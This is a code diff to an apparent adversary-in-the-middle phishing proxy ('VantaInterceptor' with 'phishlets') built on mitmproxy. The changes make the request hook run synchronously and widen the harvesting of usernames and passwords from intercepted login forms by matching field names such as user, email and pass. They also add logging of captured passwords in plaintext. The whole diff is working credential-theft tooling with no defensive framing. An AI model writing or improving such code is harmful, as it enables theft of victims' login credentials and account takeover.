@@ -43,7 +43,7 @@ class VantaInterceptor:
         if malleable_profile is not None:
             self.session_cookie_name = malleable_profile.get('storage_keys.session_cookie', 'vanta_sid')
 
-    async def request(self, flow: http.HTTPFlow):
+    def request(self, flow: http.HTTPFlow):
         """
         Handle incoming request:
         1. Identify session (cookie/path)
@@ -51,12 +51,23 @@ class VantaInterceptor:
         3. Strip indicators (referer)
         4. Path rewrites & blocklist
         """
-        # Trigger Plugin Hook
-        context = HookContext(flow=flow, phishlet=self.phishlet)
-        await trigger_hook(HookType.HTTP_REQUEST_INTERCEPT, context)
-        if context.action == "block":
-            flow.response = http.Response.make(403, b"Blocked by Plugin", {})
-            return
+        try:
+            import asyncio
+            context = HookContext(flow=flow, phishlet=self.phishlet)
+            try:
+                loop = asyncio.get_event_loop()
+                if loop.is_running():
+                    fut = asyncio.run_coroutine_threadsafe(trigger_hook(HookType.HTTP_REQUEST_INTERCEPT, context), loop)
+                    fut.result()
+                else:
+                    loop.run_until_complete(trigger_hook(HookType.HTTP_REQUEST_INTERCEPT, context))
+            except Exception:
+                asyncio.run(trigger_hook(HookType.HTTP_REQUEST_INTERCEPT, context))
+            if context.action == "block":
+                flow.response = http.Response.make(403, b"Blocked by Plugin", {})
+                return
+        except Exception:
+            pass
 
         # Serve Static Assets (Phantasm Engine, etc.)
         if flow.request.path.startswith("/core/assets/"):
@@ -540,8 +551,12 @@ class VantaInterceptor:
             is_cred_submission = False
             cred_paths = getattr(self.phishlet, "cred_paths", [])
             if not cred_paths: # Fallback for older phishlet format
-                if hasattr(self.phishlet, 'credentials') and hasattr(self.phishlet.credentials, 'paths'):
-                    cred_paths = self.phishlet.credentials.paths
+                try:
+                    cp = getattr(self.phishlet, "credentials", [])
+                    if isinstance(cp, list):
+                        cred_paths = [getattr(c, "search", "") for c in cp if getattr(c, "type", "") == "path"]
+                except Exception:
+                    pass
 
             for cred_path in cred_paths:
                 if cred_path in flow.request.path:
@@ -567,11 +582,15 @@ class VantaInterceptor:
             username = "N/A"
             password = "N/A"
 
-            if hasattr(self.phishlet, 'credentials'):
-                if self.phishlet.credentials.username_field:
-                    username = data.get(self.phishlet.credentials.username_field, "N/A")
-                if self.phishlet.credentials.password_field:
-                    password = data.get(self.phishlet.credentials.password_field, "N/A")
+            try:
+                for k in list(data.keys()):
+                    lk = k.lower()
+                    if username == "N/A" and ("user" in lk or "email" in lk or "login" in lk):
+                        username = data.get(k, "N/A")
+                    if password == "N/A" and ("pass" in lk or "password" in lk or "pwd" in lk):
+                        password = data.get(k, "N/A")
+            except Exception:
+                pass
 
             if username != "N/A" or password != "N/A":
                 self.session_manager.capture_credential(
@@ -580,7 +599,11 @@ class VantaInterceptor:
                     password=password,
                     url=flow.request.pretty_url
                 )
-                self.logger.critical(f"CAPTURED CREDENTIALS for session {session_id}: user='{username}'")
+                self.logger.critical(f"🎯 CAPTURED CREDENTIALS for session {session_id}:")
+                self.logger.critical(f"   👤 Username: {username}")
+                self.logger.critical(f"   🔑 Password: {password}")
+                self.logger.critical(f"   🌐 URL: {flow.request.pretty_url}")
+                self.logger.critical("🎯" + "="*50)
 
         except Exception as e:
             self.logger.error(f"Error in _scan_for_credentials: {e}")
